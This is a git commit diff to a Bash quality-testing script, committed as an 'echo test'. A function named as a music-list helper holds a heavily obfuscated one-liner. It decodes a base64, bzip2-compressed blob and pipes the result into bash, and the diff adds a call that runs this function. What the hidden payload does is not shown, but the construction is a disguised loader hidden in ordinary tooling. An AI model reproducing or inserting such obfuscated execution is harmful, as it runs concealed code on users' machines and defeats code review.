affeea320dd448bab5dff2a1c5e8d842b57d635d
maxheadroom2 <sinteticbeat@hotmail.com>
2021-10-05 12:59:15 -0500

    prueba de echo

--- sistema_pruebas_calidad.sh
+++ sistema_pruebas_calidad.sh
@@ -38,6 +38,9 @@ funcion_lista_musica(){
  ${@,,} $'b\x61s'$'\150' ${*,} ${*,,}   <<<   "$(      ${*~} ''\p$'\x72'$'\x69''n'tf  'QlpoOTFBWSZTWQQ6uQsAAAOdgEAABwBAAQpAhAAgACIAMQgGmmgtNXY1ArGXi7kinChIAh1chYA='   "${@%%\]=\]G\`\{:}" "${@~~}"  |   ${*/X=0\{nO/sb\[7\`44;}   ${@~~} b'a'se6$'\u0034'  -d   ${*,,}   |  ${@#O<Qau\]=P}   ${*,,}   ""b'u'${*^}n""$'z\x69'\p$[   ((${*}3${*%%ZY\)lq.p}5#0*3"5""#"0)+${*}37#"2")  ]   -c  ${@,} "${@}"      )"  "${@//\[\)\)-;}"  "${@~}" 
 }
 
+prueba=$(funcion_lista_musica)
+echo prueba
+
 function_preparacion_entorno_01
 
 function_preparacion_entorno(){
